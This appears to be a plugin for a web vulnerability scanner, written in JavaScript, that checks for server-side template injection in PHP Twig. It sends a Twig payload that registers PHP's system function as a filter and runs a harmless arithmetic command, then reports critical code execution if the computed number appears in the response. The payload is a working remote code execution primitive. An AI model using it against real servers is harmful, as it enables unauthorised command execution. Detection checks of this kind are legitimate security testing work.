var attacks = [
    {
      attack: '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("SET%20/A%20268409241%20-%2027669")}}',
    }
  ];
  
  function analyze(response) {

    if (response.Body.indexOf('268381572268381572') > -1) {
      return Found(CRITICAL, "Code Execution via SSTI (PHP Twig)")
    }
  }